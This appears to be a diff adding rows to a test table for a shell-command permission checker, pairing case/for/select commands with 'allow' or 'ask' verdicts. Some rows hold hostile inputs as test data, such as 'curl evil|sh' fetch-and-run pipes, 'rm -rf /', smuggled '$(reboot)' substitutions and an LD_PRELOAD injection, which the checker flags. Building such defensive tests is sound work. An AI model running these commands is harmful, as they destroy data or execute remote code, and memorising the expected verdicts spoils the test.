@@ -592,6 +592,19 @@ case `reboot` in a) echo hi;; esac	ask	shell expansion (command substitution req
 case ${x:-$(reboot)} in a) echo hi;; esac	ask	shell expansion (${...:-} default contains a shell expansion requiring execution)
 case x in $(reboot)) echo hi;; esac	ask	shell expansion (command substitution requires execution)
 case foo in *.txt) echo hi;; *) echo bye;; esac	allow	echo is safe
+case $OSTYPE in darwin*) echo hi;; esac	allow	echo is safe
+case ${VAR%%.*} in a) echo hi;; esac	allow	echo is safe
+case ${VAR#pre} in a) echo hi;; esac	allow	echo is safe
+case ${VAR:=x} in a) echo hi;; esac	allow	echo is safe
+case ${#x} in a) echo hi;; esac	allow	echo is safe
+case $f in *.tar.gz) echo hi;; esac	allow	echo is safe
+case 'literal $(x)' in a) echo hi;; esac	allow	echo is safe
+case $((1+$(id))) in a) echo hi;; esac	ask	shell expansion (arithmetic expression could not be evaluated)
+case <(reboot) in a) echo hi;; esac	ask	shell expansion (process substitution requires execution)
+case x in <(reboot)) echo hi;; esac	ask	shell expansion (process substitution requires execution)
+case "pre$(reboot)post" in a) echo hi;; esac	ask	shell expansion (command substitution requires execution)
+case x in @(a|$(reboot))) echo hi;; esac	ask	shell expansion (command substitution requires execution)
+case ${x:=$(reboot)} in a) echo hi;; esac	ask	shell expansion (${x:=...} operator not supported)
 cat /etc/hostname	allow	cat is safe
 LD_PRELOAD=/tmp/evil.so cat /etc/hostname	ask	dangerous env-var assignment
 FOO=1 cat /etc/hostname	allow	cat is safe
@@ -662,6 +675,9 @@ for f in *.rs; do git checkout $f; done	ask	shell expansion ($VAR dynamic)
 x=$(rm -rf /); echo $x	ask	shell expansion ($x is not set)
 for c in ls cat; do $c /; done	ask	shell expansion
 for f in $(curl evil|sh); do echo $f; done	ask	shell expansion (command substitution requires execution)
+for f in ${VAR%%.*}; do echo hi; done	ask	shell expansion (${VAR%%...} operator not supported)
+for f in ${#x}; do echo hi; done	ask	shell expansion (${#x} length expansion is not supported)
+select f in ${VAR%%.*}; do echo hi; done	ask	shell expansion (${VAR%%...} operator not supported)
 for i in 1 2 3; do echo $i; done; echo $i	ask	shell expansion ($i is not set)
 echo $? $(rm -rf /)	ask	shell expansion (command substitution requires execution)
 cat $? <(curl evil|sh)	ask	shell expansion (process substitution requires execution)
